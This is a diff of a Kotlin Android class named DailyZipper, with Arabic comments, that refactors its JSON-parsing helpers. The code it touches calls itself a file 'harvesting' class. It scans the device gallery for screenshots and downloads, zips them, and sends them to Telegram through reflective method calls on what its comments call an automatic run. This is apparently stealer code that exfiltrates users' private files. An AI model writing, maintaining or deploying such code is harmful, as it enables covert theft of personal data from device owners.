@@ -23,41 +23,8 @@ import java.util.concurrent.atomic.AtomicBoolean
 import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 
-// ===== دوال مساعدة آمنة تعمل مع JSONObject =====
-private fun extractBoolean(obj: Any?, key: String): Boolean {
-    return when (obj) {
-        is JSONObject -> obj.optBoolean(key, false)
-        is Map<*, *> -> {
-            // Fallback آمن للمعالجة إذا كان Map
-            for (entry in obj.entries) {
-                if (entry.key.toString() == key) {
-                    return entry.value as? Boolean ?: false
-                }
-            }
-            false
-        }
-        else -> false
-    }
-}
-
-private fun extractString(obj: Any?, key: String): String {
-    return when (obj) {
-        is JSONObject -> obj.optString(key, "")
-        is Map<*, *> -> {
-            // Fallback آمن للمعالجة إذا كان Map
-            for (entry in obj.entries) {
-                if (entry.key.toString() == key) {
-                    return entry.value?.toString() ?: ""
-                }
-            }
-            ""
-        }
-        else -> ""
-    }
-}
-
 /**
- * فئة تجميع الملفات وحصادها - خالية تماماً من أي تعارض مع التعبيرات النمطية
+ * فئة تجميع الملفات وحصادها - خالية تماماً من أي دوال مساعدة قد تتعارض
  */
 class DailyZipper(
     context: Context,
@@ -299,7 +266,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إرسال الملفات إلى Telegram - باستخدام extractBoolean (تدعم JSONObject)
+    //  إرسال الملفات إلى Telegram - بدون دوال مساعدة
     // ============================================================
 
     private suspend fun safeSend(
@@ -334,9 +301,21 @@ class DailyZipper(
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
 
+                // استخراج قيمة "ok" مباشرة باستخدام JSONObject أو Map
                 val success = when (result) {
                     is Boolean -> result
-                    else -> extractBoolean(result, "ok")
+                    is JSONObject -> result.optBoolean("ok", false)
+                    is Map<*, *> -> {
+                        var ok = false
+                        for (entry in result.entries) {
+                            if (entry.key.toString() == "ok") {
+                                ok = entry.value as? Boolean == true
+                                break
+                            }
+                        }
+                        ok
+                    }
+                    else -> false
                 }
 
                 if (success) {
@@ -644,7 +623,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  التشغيل التلقائي - باستخدام extractString (تدعم JSONObject)
+    //  التشغيل التلقائي - بدون دوال مساعدة
     // ============================================================
 
     fun run(): Boolean {
@@ -665,7 +644,21 @@ class DailyZipper(
                     listOf("screenshot", "download").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            val path = extractString(item, "path")
+                            // استخراج المسار مباشرة
+                            val path = when (item) {
+                                is JSONObject -> item.optString("path", "")
+                                is Map<*, *> -> {
+                                    var p = ""
+                                    for (entry in item.entries) {
+                                        if (entry.key.toString() == "path") {
+                                            p = entry.value?.toString() ?: ""
+                                            break
+                                        }
+                                    }
+                                    p
+                                }
+                                else -> ""
+                            }
                             if (path.isNotEmpty()) {
                                 val f = File(path)
                                 if (f.exists()) {
@@ -766,11 +759,10 @@ class DailyZipper(
     private fun invokeMethodFallback(target: Any?, methodName: String, vararg args: Any?): Any? {
         if (target == null) return null
         return try {
-            // محاولة العثور على الطريقة بمطابقة عدد المعاملات
             val method = target.javaClass.methods.firstOrNull { m ->
                 m.name == methodName && m.parameterTypes.size == args.size
             } ?: return null
-            method.isAccessible = true  // ✅ تم تصحيح الخطأ الإملائي
+            method.isAccessible = true
             method.invoke(target, *args)
         } catch (e: Exception) {
             writeLog("Method invocation error ($methodName): ${e.message}")
